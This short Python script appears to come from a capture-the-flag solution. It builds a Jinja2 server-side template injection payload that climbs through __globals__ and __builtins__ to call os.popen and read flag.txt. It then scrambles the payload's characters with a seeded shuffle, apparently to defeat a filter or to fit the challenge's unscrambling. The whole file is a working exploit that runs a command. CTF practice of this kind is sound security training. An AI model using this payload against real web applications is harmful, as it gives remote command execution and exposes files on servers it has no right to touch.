from random import seed, shuffle

seed(0)

payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"
inp_list = list(range(len(payload)))

shuffle(inp_list)

web_payload = [0]*len(payload)

for i, j in zip(inp_list, payload):
    web_payload[i] = j
    
print("".join(web_payload))
